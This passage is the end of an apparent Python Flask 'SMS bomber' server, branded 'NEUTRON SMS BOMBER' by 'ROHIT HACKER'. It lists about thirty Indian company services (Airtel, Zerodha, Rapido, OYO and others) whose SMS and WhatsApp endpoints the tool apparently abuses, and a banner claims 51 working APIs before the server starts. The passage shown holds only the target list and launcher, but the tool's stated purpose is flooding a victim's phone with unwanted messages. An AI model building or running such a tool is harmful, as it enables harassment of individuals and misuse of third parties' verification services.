        "Airtel Thanks", "KPN WhatsApp", "Jockey WhatsApp", "NoBroker SMS",
        "Lenskart SMS", "Byju's SMS", "OYO SMS", "Breeze Session",
        "KPN Fresh 2", "Aditya Birla", "Muthoot Finance", "GoPaySense",
        "Dream11", "Spinny", "Rapido", "BetterHalf",
        "Charzer", "Mpokket", "ixigo", "Zerodha",
        "Testbook", "MediBuddy", "Udaan", "Vidyakul",
        "Beyoung", "Wrogn", "Medkart", "Lovelocal",
        "Tyreplex", "Citymall", "Pagarbook"
    ]
    return jsonify({
        "total": len(apis),
        "apis": apis,
        "status": "active"
    })

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("""
    ╔═══════════════════════════════════════════╗
    ║   🚀 NEUTRON SMS BOMBER - RENDER EDITION ║
    ╠═══════════════════════════════════════════╣
    ║   Developer: ROHIT HACKER                ║
    ║   APIs Loaded: 51 ✅ CONFIRMED WORKING   ║
    ║   Server: http://0.0.0.0:%s           ║
    ║   FAST MODE: ON ⚡                       ║
    ╚═══════════════════════════════════════════╝
    """ % port)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)